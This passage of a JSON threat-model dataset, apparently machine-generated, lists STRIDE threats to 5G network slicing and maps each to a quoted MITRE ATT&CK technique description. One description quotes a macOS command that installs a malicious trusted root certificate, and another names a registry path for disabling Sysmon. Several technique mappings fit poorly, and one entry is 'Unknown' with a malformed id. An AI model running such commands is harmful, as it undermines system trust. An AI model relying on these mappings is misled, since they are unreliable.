                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could launch a distributed denial-of-service (DDoS) attack on a network slice, overwhelming its resources.",
            "Assumptions": [
                {
                    "Assumption": "Sufficient attack bandwidth.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to enough bandwidth to launch a DDoS attack."
                },
                {
                    "Assumption": "Lack of DDoS mitigation mechanisms.",
                    "Role": "Attacker",
                    "Condition": "The system does not have effective DDoS mitigation mechanisms in place."
                },
                {
                    "Assumption": "Public-facing interfaces.",
                    "Role": "Attacker",
                    "Condition": "Network slices have public-facing interfaces vulnerable to DDoS attacks."
                }
            ],
            "Potential Impact": "Service disruption and degradation of performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "network slice",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could exploit a vulnerability to crash virtual network functions (VNFs).",
            "Assumptions": [
                {
                    "Assumption": "Existence of exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "VNFs have unpatched vulnerabilities that can be exploited."
                },
                {
                    "Assumption": "Access to VNF instances.",
                    "Role": "Attacker",
                    "Condition": "The attacker can access VNF instances for exploitation."
                },
                {
                    "Assumption": "Lack of monitoring for VNF health.",
                    "Role": "Attacker",
                    "Condition": "The system does not monitor VNF health and status effectively."
                }
            ],
            "Potential Impact": "Loss of functionality and possible service interruptions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "exploitation",
                "vulnerability",
                "virtual network function"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could consume all available resources by continuously requesting orchestration services.",
            "Assumptions": [
                {
                    "Assumption": "Lack of rate limiting.",
                    "Role": "Attacker",
                    "Condition": "The system does not implement rate limiting for orchestration requests."
                },
                {
                    "Assumption": "Access to orchestration interfaces.",
                    "Role": "Attacker",
                    "Condition": "The attacker can interact with orchestration interfaces."
                },
                {
                    "Assumption": "Absence of anomaly detection.",
                    "Role": "Attacker",
                    "Condition": "The system does not detect and respond to abnormal usage patterns."
                }
            ],
            "Potential Impact": "Resource exhaustion leading to service unavailability and degradation.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "orchestration",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--018cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit a vulnerability to gain administrative access to network slices.",
            "Assumptions": [
                {
                    "Assumption": "Existence of exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities exist that can be exploited for privilege escalation."
                },
                {
                    "Assumption": "Access to vulnerable components.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to the components that contain vulnerabilities."
                },
                {
                    "Assumption": "Lack of effective privilege separation.",
                    "Role": "Attacker",
                    "Condition": "The system does not enforce robust privilege separation."
                }
            ],
            "Potential Impact": "Unauthorized administrative access and potential manipulation of network slices.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "exploitation",
                "administrative access",
                "network slice"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit misconfigured access controls to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigured access controls.",
                    "Role": "Attacker",
                    "Condition": "Access controls are not configured correctly."
                },
                {
                    "Assumption": "Access to interfaces with misconfigured access.",
                    "Role": "Attacker",
                    "Condition": "The attacker can interact with interfaces that have misconfigured access controls."
                },
                {
                    "Assumption": "Lack of regular access reviews.",
                    "Role": "Attacker",
                    "Condition": "The system does not regularly review and audit access permissions."
                }
            ],
            "Potential Impact": "Elevation of privileges leading to unauthorized operations and access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "misconfiguration",
                "access control",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider could use existing privileges to access restricted areas of the network.",
            "Assumptions": [
                {
                    "Assumption": "Existing privileges allow lateral movement.",
                    "Role": "Insider",
                    "Condition": "The insider's current privileges allow for lateral movement within the network."
                },
                {
                    "Assumption": "Insufficient monitoring of privileged actions.",
                    "Role": "Insider",
                    "Condition": "The system does not monitor actions performed by privileged users effectively."
                },
                {
                    "Assumption": "Lack of segmentation within the network.",
                    "Role": "Insider",
                    "Condition": "The network is not sufficiently segmented to prevent unauthorized access."
                }
            ],
            "Potential Impact": "Access to restricted data and areas, leading to potential misuse and data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider",
                "privileged access",
                "network segmentation"
            ],
            "mitre_technique": {
                "name": "Network Boundary Bridging",
                "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
                "technique_id": "T1599"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "28",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate Network Function to gain unauthorized access to network slices.",
            "Assumptions": [
                {
                    "Assumption": "No robust authentication mechanism is in place for NFs.",
                    "Role": "Network Administrator",
                    "Condition": "NFs and VNFs lack strong, mutual authentication."
                },
                {
                    "Assumption": "The attacker has the ability to access the network infrastructure.",
                    "Role": "Security Analyst",
                    "Condition": "Network access controls are insufficient."
                },
                {
                    "Assumption": "NFs communicate over unencrypted channels.",
                    "Role": "Infrastructure Manager",
                    "Condition": "Proper encryption protocols are not enforced."
                }
            ],
            "Potential Impact": "Data confidentiality and integrity could be compromised, leading to unauthorized data access and tampering.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network function",
                "authentication bypass",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An external interface impersonates a trusted service provider to inject malicious VNFs.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are not adequately authenticated.",
                    "Role": "Interface Manager",
                    "Condition": "Weak or no validation of external service providers."
                },
                {
                    "Assumption": "Malicious actor has access to service provider credentials.",
                    "Role": "Security Auditor",
                    "Condition": "Credentials are exposed or poorly managed."
                },
                {
                    "Assumption": "Communication between external interfaces and edge/cloud computing nodes is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of encryption in data transmission."
                }
            ],
            "Potential Impact": "Elevation of privilege and unauthorized control over network slices, impacting system integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "external interface",
                "malicious VNF injection",
                "credential misuse"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary mimics orchestration and management commands to directly manipulate network slice configurations.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration commands are not securely authenticated.",
                    "Role": "Orchestration Manager",
                    "Condition": "Use of weak or outdated authentication mechanisms."
                },
                {
                    "Assumption": "Attacker has network access to orchestration components.",
                    "Role": "Security Engineer",
                    "Condition": "Network segment isolation is not maintained."
                },
                {
                    "Assumption": "Command channels are not encrypted or integrity-checked.",
                    "Role": "Infrastructure Security Specialist",
                    "Condition": "Neglect of encryption and integrity checks."
                }
            ],
            "Potential Impact": "Uncontrolled tampering with network slice configurations, leading to service disruption and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "orchestration command",
                "configuration manipulation",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters communication between NFs, compromising the integrity of transmitted data.",
            "Assumptions": [
                {
                    "Assumption": "Inter-NF communication is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of encryption for inter-NF data transmission."
                },
                {
                    "Assumption": "The network is susceptible to MITM (Man-In-The-Middle) attacks.",
                    "Role": "Security Analyst",
                    "Condition": "Weak network access controls and monitoring."
                },
                {
                    "Assumption": "NFs do not verify the integrity of received data.",
                    "Role": "Network Function Developer",
                    "Condition": "No integrity checks on incoming data."
                }
            ],
            "Potential Impact": "Data integrity could be compromised, leading to erroneous or manipulated data being processed by the network.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "man-in-the-middle",
                "NF communication",
                "data integrity attack"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious actor gains access to the orchestration and management platform to alter configurations and deployments of VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration platform is not sufficiently secured.",
                    "Role": "Orchestration Manager",
                    "Condition": "Weak access controls and authentication mechanisms."
                },
                {
                    "Assumption": "Administrative access is inadequately managed.",
                    "Role": "Security Administrator",
                    "Condition": "Poor administrative credential management."
                },
                {
                    "Assumption": "Changes in the orchestration platform are not logged or monitored.",
                    "Role": "IT Auditor",
                    "Condition": "Lack of comprehensive logging and monitoring."
                }
            ],
            "Potential Impact": "Compromise of system integrity, leading to potential service disruptions and configuration mismatches.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration platform",
                "VNF configuration",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data traversing trust boundaries, affecting the proper functioning of network slices.",
            "Assumptions": [
                {
                    "Assumption": "Data integrity is not verified across trust boundaries.",
                    "Role": "Network Security Engineer",
                    "Condition": "Lack of data integrity validation mechanisms."
                },
                {
                    "Assumption": "Trust boundaries are not adequately monitored.",
                    "Role": "Network Surveillance Officer",
                    "Condition": "Insufficient monitoring of trust boundary activities."
                },
                {
                    "Assumption": "The attacker has the necessary privileges to access data crossing trust boundaries.",
                    "Role": "Access Control Manager",
                    "Condition": "Inappropriate access control policies."
                }
            ],
            "Potential Impact": "Integrity and availability of network slices could be compromised, leading to malfunctioning network services.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "trust boundary",
                "data integrity",
                "network slice functionality"
            ],
            "mitre_technique": {
                "name": "Network Boundary Bridging",
                "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
                "technique_id": "T1599"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs actions within the network without leaving sufficient logs to identify their activities.",
            "Assumptions": [
                {
                    "Assumption": "Log generation and storage are insufficient.",
                    "Role": "Log Manager",
                    "Condition": "Inadequate logging mechanisms."
                },
                {
                    "Assumption": "The system does not have robust non-repudiation controls.",
                    "Role": "Security Auditor",
                    "Condition": "Lack of enforceable non-repudiation measures."
                },
                {
                    "Assumption": "Malicious actors can disable or bypass logging mechanisms.",
                    "Role": "Security Administrator",
                    "Condition": "Logging mechanisms are vulnerable to tampering."
                }
            ],
            "Potential Impact": "Accountability is lost, making it difficult to detect and respond to unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "non-repudiation bypass",
                "action concealment"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Unauthorized changes to network slice configurations are made without being traceable to a specific actor.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not adequately logged.",
                    "Role": "Configuration Manager",
                    "Condition": "Insufficient logging of configuration changes."
                },
                {
                    "Assumption": "The network lacks an automated audit trail for configuration activities.",
                    "Role": "Audit Manager",
                    "Condition": "No automated tracking of configuration changes."
                },
                {
                    "Assumption": "Access controls do not enforce proper accountability.",
                    "Role": "Security Engineer",
                    "Condition": "Weak access control policies."
                }
            ],
            "Potential Impact": "Compromise of system integrity and difficulty in tracing back unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration change",
                "audit trail disruption",
                "accountability loss"
            ],
            "mitre_technique": {
                "name": "SNMP (MIB Dump)",
                "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
                "technique_id": "T1602.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider modifies the orchestration and management scripts without leaving an audit trail.",
            "Assumptions": [
                {
                    "Assumption": "Scripts and automation actions are not logged.",
                    "Role": "Automation Engineer",
